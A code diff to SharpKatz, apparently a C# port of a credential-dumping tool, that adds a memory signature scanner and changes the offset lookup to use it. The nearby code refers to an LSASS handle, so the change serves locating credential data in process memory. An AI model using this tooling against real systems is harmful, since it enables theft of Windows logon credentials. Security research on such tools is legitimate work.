@@ -44,6 +44,35 @@ namespace SharpKatz
             return offset;
         }
 
+        public static ulong SearchPattern(IntPtr mem, byte[] signature, long max_search_size)
+        {
+            ulong offset = 0;
+            ulong memlen = (ulong)max_search_size;
+            ulong signlen = (ulong)signature.Length;
+
+            for (ulong i = 0; i < memlen; i++)
+            {
+                for (uint j = 0; j < signlen; j++)
+                {
+                    byte memByte = Marshal.ReadByte(IntPtr.Add(mem, (int)(i + j)));
+                    if (signature[j] != memByte)
+                    {
+                        break;
+                    }
+                    else
+                    {
+                        if (j == (signlen - 1))
+                        {
+                            offset = i;
+                            return offset;
+                        }
+                    }
+                }
+            }
+
+            return offset;
+        }
+
         public static ulong OffsetFromSign(string modulename, byte[] sign, long max_search_size)
         {
             IntPtr moduleLocal;
@@ -55,10 +84,8 @@ namespace SharpKatz
                 return 0;
             }
 
-            byte[] tmpbytes = new byte[max_search_size];
-            Marshal.Copy(moduleLocal, tmpbytes, 0, (int)max_search_size);
-
-            return SearchPattern(tmpbytes, sign);
+            //return SearchPattern(tmpbytes, sign);
+            return SearchPattern(moduleLocal, sign, max_search_size);
         }
 
         public static IntPtr GetIntPtr(IntPtr hLsass, IntPtr msvMem, long signOffset, int targetoffset)
